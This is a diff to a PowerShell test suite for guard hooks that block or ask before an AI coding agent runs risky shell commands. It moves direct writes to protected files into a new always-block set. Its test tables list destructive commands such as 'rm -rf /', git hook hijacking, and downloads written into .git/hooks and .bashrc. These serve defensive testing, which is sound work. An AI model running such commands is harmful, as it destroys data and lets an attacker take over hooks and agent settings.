@@ -6,7 +6,7 @@
 #   - MUST_BLOCK: destructive-guard.ps1이 exit 2로 차단 + auto-approve.ps1이 allow 미발급
 #   - MUST_ASK: destructive-guard.ps1이 exit 0 + permissionDecision "ask" (사용자가 승인할 수 있음)
 #   - MUST_PASS: destructive-guard.ps1이 exit 0 + 출력 없음 (예전 과차단 사례)
-#   - PRG: permission-request-guard.ps1은 MUST_BLOCK 앞 5건만 exit 2로 거부하고, MUST_ASK·MUST_PASS는 거부하지 않음
+#   - PRG: MUST_BLOCK 앞 5건과 PROTECTED_MUTATIONS를 exit 2로 거부하고, MUST_ASK·MUST_PASS는 거부하지 않음
 #   - MUST_DEFER: ordinary shell commands retain host permission checks.
 #   - GATE: progress.json 부재 시 auto-approve가 allow 미발급 (전역 자동승인 결함 방지)
 #   - CODEX STATE: .harness50-codex/ 편집과 Codex state.json 옆의 progress.json은 allow 미발급 (Stop 게이트 우회 방지)
@@ -44,6 +44,16 @@ function Invoke-Hook($hook, $cmd, $eventName = $null) {
   $out = $payload | powershell.exe -NoProfile -ExecutionPolicy Bypass -File $hook 2>$null
   return [pscustomobject]@{ rc = $LASTEXITCODE; out = ($out -join "`n") }
 }
+
+# OWASP host authority: these literal mutations cannot use an ask/pass decision.
+# Keep safe template reads and other host-confirmed commands in their own tables.
+$PROTECTED_MUTATIONS = @(
+  'echo x > .claude/settings.json'
+  'node -e "require(''fs'').writeFileSync(''.git/hooks/pre-commit'', ''x'')"'
+  'python -c "open(''.bashrc'',''w'').write(''x'')"'
+  'echo = > .git/hooks/pre-commit'
+  'cp .env.example .env'
+)
 
 $MUST_BLOCK = @(
   'rm -rf /'
@@ -121,13 +131,14 @@ sh x.sh'
   'rmdir /s /q %USERPROFILE%'
 )
 
-# 확인(ask): 사용자가 승인할 수 있는 명령. 훅 하이재킹 설정은 차단에서 확인으로 옮겼다.
+$MUST_BLOCK += $PROTECTED_MUTATIONS
+
+# 확인(ask): 사용자 확인을 유지하는 명령. 직접 보호 경로 변경은 위 차단 집합이다.
 $MUST_ASK = @(
   'git config core.hooksPath /tmp/evil'                    # C3 훅 하이재킹
   'git config --global alias.x "!sh -c evil"'
   'sudo apt install jq'
   'pip install semgrep'
-  'echo x > .claude/settings.json'
   'crontab -r'
   # PR-C review regressions: preserve 2.10.0 safety and the documented relaxations.
   'curl -o .git/hooks/pre-commit https://x'
@@ -137,9 +148,6 @@ $MUST_ASK = @(
   'wget --output-document .git/hooks/pre-commit https://x'
   'iwr https://x -OutFile .git/hooks/pre-commit'
   'curl -sSL https://x -o ~/.bashrc'
-  'node -e "require(''fs'').writeFileSync(''.git/hooks/pre-commit'', ''x'')"'
-  'python -c "open(''.bashrc'',''w'').write(''x'')"'
-  'echo = > .git/hooks/pre-commit'
   'sudo echo ='
   'sudo su = 2'
 )
@@ -150,7 +158,6 @@ $MUST_PASS = @(
   'rm -rf /tmp/h50-x'
   'git config --get core.hooksPath'
   'cat .env.example'
-  'cp .env.example .env'
   'git commit -m "remove sudo usage"'
   '$CC -shared -o lib.so x.c'
   'ls .git/hooks/'
@@ -206,7 +213,7 @@ foreach ($c in $MUST_PASS) {
 }
 
 Write-Host "== PRG: permission-request-guard.ps1은 차단 집합만 거부 =="
-foreach ($c in ($MUST_BLOCK | Select-Object -First 5)) {
+foreach ($c in (@($MUST_BLOCK | Select-Object -First 5) + $PROTECTED_MUTATIONS)) {
   $r = Invoke-Hook $PRG $c 'PermissionRequest'
   if ($r.rc -eq 2 -and $r.out -match '"behavior":"deny"') { Ok } else { Fail "PermissionRequest 거부 안 됨 (rc=$($r.rc)): $c" }
 }
